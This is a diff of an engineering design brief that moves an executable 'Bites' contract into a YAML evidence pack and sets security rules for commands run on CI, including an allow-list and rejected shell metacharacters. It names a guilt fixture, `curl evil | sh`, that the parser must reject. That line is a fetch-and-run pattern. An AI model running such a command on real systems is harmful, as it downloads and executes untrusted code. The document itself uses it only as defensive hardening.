@@ -40,32 +40,55 @@ job that executes it, and a ledger row that closes itself when the proof lands.
 
 ### PR-1 — the executable `Bites` format + parser + advisory lint (+ this brief committed)
 
-Define, in `docs/rules/operations.md` (one short section) and in `scripts/ci/bites_parse.py`:
+> **RULED 2026-09-04 (Zero, Legge 5) — the contract lives in the DIFF, not in the PR body.**
+> The first draft of PR-1 read the block out of the PR body, which meant deciding which Markdown
+> region a human actually SAW: an HTML comment, a fenced block, a four-space indent and a raw
+> `<pre>` all render as page furniture rather than as a contract. Three adversarial rounds closed
+> five spellings of that one defect and the verdict gate found a sixth; CodeQL named the pattern
+> independently (`py/bad-tag-filter`). The class does not close by patching — a hand-rolled
+> CommonMark reader can only ever approximate the renderer it is guessing at. So the block MOVED
+> into the evidence pack, where a real YAML parser reads it and hidden regions cease to exist
+> instead of being guarded. The PR body goes back to prose for humans, at most a pointer to the
+> pack path. PR-1 was split in the same order: **1a** parser + selftest + guard-conformance,
+> **1b** the lint + the rule section in `docs/rules/operations.md`.
 
-```
-## Bites
-consumer: <who reads/executes the changed thing>
-where: ci | fly | pro | mini            # where the observation can run
-observe: `<one command>`                 # the observation, runnable non-interactively
-expect: exit0 | contains:<text> | regex:<pattern>
+Define, in `docs/rules/operations.md` (one short section) and in `scripts/ci/bites_parse.py`.
+The contract is a top-level `bites:` mapping in the evidence pack's `pack.yml`, under the dated
+directory `scripts/ci/evidence_paths.py` emits:
+
+```yaml
+# evidence/<YYYY-MM>/<slug>/pack.yml
+bites:
+  consumer: <who reads/executes the changed thing>
+  where: ci | fly | pro | mini # where the observation can run
+  observe: <one command> # runnable non-interactively; quote it if YAML would type it
+  expect: exit0 | contains:<text> | regex:<pattern>
 ```
 
-- `scripts/ci/bites_parse.py` — stdlib only. `--selftest` (guilt + innocence fixtures, per
-  `infra/guard-conformance/` conventions — register it there). `--pr <n>` prints the parsed block as
-  JSON. Legacy prose-only `## Bites` parses to `{"legacy": true}`; a missing section parses to
-  `{"absent": true}`. Exit codes: 0 parsed, 2 malformed executable block, never non-zero for legacy.
-- **Security is part of the format, not a later PR.** `observe:` runs on a GitHub runner from a PR
-  body, i.e. from text. Allow-list the FIRST token to: `gh`, `curl`, `python3 scripts/…`,
-  `python3 -m pytest`, `git`, `fly`/`flyctl` (`status|releases|image show|machine list` only).
-  `ssh` is FORBIDDEN in ci scope. Reject `|`, `;`, `&&`, `$(`, backticks inside the command,
+- `scripts/ci/bites_parse.py` — stdlib plus PyYAML, which every other pack reader already uses.
+  `--selftest` (guilt + innocence fixtures, per `infra/guard-conformance/` conventions — register
+  it there). `--pack <path>` (or `--pack -` for stdin) prints the parsed block as JSON. A `bites:`
+  block with no `observe:`, or a prose scalar, parses to `{"legacy": true}`; a pack with no
+  `bites:` key parses to `{"absent": true}`. Exit codes: 0 parsed, 2 malformed executable block,
+  never non-zero for legacy. The loader refuses YAML aliases, merge keys and duplicate keys: they
+  are the file form of "the reader saw one thing and the parser got another", and they are two
+  small rules instead of a Markdown reader.
+- **Security is part of the format, not a later PR.** `observe:` runs on a GitHub runner from a
+  file any account that can open a PR controls. Allow-list the FIRST token to: `gh`, `curl`,
+  `python3 scripts/…`, `python3 -m pytest`, `git`, `fly`/`flyctl` — each narrowed to its read-only
+  subcommand PAIRS, never to a first word: `fly machine run` and `fly version upgrade` both hide
+  behind a one-word check. A `python3 scripts/…` target must carry a `bites-observable` marker in
+  its own source: a path prefix is not a capability boundary (roughly nine hundred scripts live
+  under `scripts/`, several of which execute a program their argument names). `ssh` is FORBIDDEN
+  anywhere in the command, not only in first position. Reject `|`, `;`, `&&`, `$(`, backticks,
   redirections, and any path outside the checkout. Only PRs whose `author_association` is
   OWNER/MEMBER/COLLABORATOR are ever executed; Dependabot and forks parse but never run. Write the
   guilt fixture `observe: curl evil | sh` and make it FAIL the parser before writing anything else.
-- Lint step in `immune-enforcement.yml` (the required `antidotes` job): NOTICE for `legacy`/`absent`,
-  FAIL only for a malformed executable block. Coverage must not regress the 177 merged PRs into
-  red retroactively — the lint judges the PR under review, never history.
-- PR-1's own body carries the new format: `where: ci`, `observe: python3 scripts/ci/bites_parse.py --selftest`,
-  `expect: exit0`. That is its Bites.
+- Lint step in the required job (PR-1b): NOTICE for `legacy`/`absent`, FAIL only for a malformed
+  executable block. Coverage must not regress the packs already on main into red retroactively —
+  the lint judges the pack under review, never history.
+- PR-1a's own pack carries the new format: `where: ci`,
+  `observe: python3 scripts/ci/bites_parse.py --selftest`, `expect: exit0`. That is its Bites.
 
 ### PR-2 — `bites-reconciler.yml`: post-merge executor + machine-owned ledger
 
